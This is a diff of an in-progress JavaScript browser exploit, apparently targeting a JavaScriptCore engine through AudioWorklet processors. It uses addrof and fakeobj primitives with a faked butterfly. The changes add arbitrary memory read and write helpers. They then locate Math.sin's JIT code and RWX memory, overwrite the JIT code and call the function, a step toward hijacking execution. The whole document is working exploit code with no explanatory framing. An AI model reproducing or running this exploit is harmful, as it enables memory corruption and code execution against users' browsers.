@@ -1,6 +1,12 @@
 // constant added to double JSValues
       //const socket = io.connect('/');
-
+/*registerProcessor("c", class {
+        constructor() {
+          // setup a message port to the main thread
+          var port5 = new AudioWorkletProcessor().port;
+          
+        }
+});*/
       function hex1(x) {
     if (x < 0)
         return `-${hex1(-x)}`;
@@ -65,6 +71,7 @@ for (var i = 0; i < 1000; ++i) {
       }
       // message port to talk to main thread; will be set later
       let port = null;
+      //let port1 = null;
       // will be implemented later
       let fakeobj = null;
       let addrof = null;
@@ -153,8 +160,41 @@ for (var i = 0; i < 1000; ++i) {
         },
 
         read64: function(where) {
+            //var reset = hax[1];
             hax[1] = qwordAsFloat(where + 0x10);
-            return this.addrof(victim1.prop);
+            var res = this.addrof(victim1.prop);
+            //hax[1] = reset;
+            //victim1.prop = shared_butterfly;
+            return res;
+        },
+        write(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write64(Add(addr, 2 * i), ints[i]);
+        },
+        read(addr, length) {
+            var a = new Array(length);
+            var i;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = this.read64(addr + i).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = this.read64(addr + i).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+
         },
 
         test: function() {
@@ -166,7 +206,8 @@ for (var i = 0; i < 1000; ++i) {
             }
 
             var val = 0x42424242;
-            this.write64(0x4141414141,0x999999999)
+            //this.write64(0x4141414141,0x999999999)
+            //this.read64(0x999999)
             this.write64(shared_butterfly - 8, 0x42424242);
             print(hex1(floatAsQword(unboxed1[1])))
             if (qwordAsFloat(val) != unboxed1[1]) {
@@ -188,18 +229,39 @@ for (var i = 0; i < 1000; ++i) {
         },
     };
 
-    stage2.test();
-    var v = 0x4141;
+    //stage2.test();
+            var v = 0x4141;
             var obj = {p: v};
+            var addr1 = stage2.addrof(v);
+            var addr = stage2.addrof(obj);
+            port.postMessage("addr deb " + hex1(addr))
+            port.postMessage(hex1(stage2.fakeobj(addr).p));
+            port.postMessage("lolzzz");
+            //var socket = new WebSocket("")
+            //const socket = new TextEncoder();
+            var mathfunc = stage2.addrof(Math.sin)
+            port.postMessage(hex1(mathfunc))
+            var exe = stage2.read64(mathfunc+0x18)
+            port.postMessage(hex1(exe))
+            var jitcode = stage2.read64(exe+0x18)
+            port.postMessage(hex1(jitcode));
+            var rwx = stage2.read64(jitcode+0x20)
+            port.postMessage(hex1(rwx))
+            stage2.write64(jitcode,0x55555555)
+            //stage2.write64(mathfunc,0x4141414141)
+            Math.sin()
+            /*while(!(port1.onmessage())) {
+                port.postMessage("not")
+            }
+            //port.onmessage = ;
+            port.onmessage = (e) => {
+                port.postMessage("gotit")
+            }*/
+            
+            //var propertyAddr = addr;
 
-            var addr = addrof(obj);
-            port.postMessage("addr deb" + hex1(addr))
-            //port.postMessage(fakeobj(addr).p);
-
-            //var propertyAddr = addr + 0x10;
-
-            //var value = stage2.read64(propertyAddr);
-            //port.postMessage("value" + hex1(value))
+            //var value = stage2.read(addr,8);
+            //port.postMessage("value" + value)
 
 
         /*var addr1 = addrof({a:0x1337});
@@ -269,7 +331,9 @@ for (var i = 0; i < 1000; ++i) {
         constructor() {
           // setup a message port to the main thread
           port = new AudioWorkletProcessor().port;
+          //port1 = new AudioWorkletProcessor().port;
           port.onmessage = pwn;
+
           // this part is magic
           // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
           eval('1 + 0x1336');
@@ -279,6 +343,10 @@ for (var i = 0; i < 1000; ++i) {
       });
       registerProcessor("b", class {
         constructor() {
+            /*port.onmessage = (e) => {
+                port1.postMessage("recieved!!!")
+            }*/
+            //port1 = new AudioWorkletProcessor().port;
           // overwrite b1's butterfly with a fastMalloc pointer
           return {fill: 1, b: b0};
         }
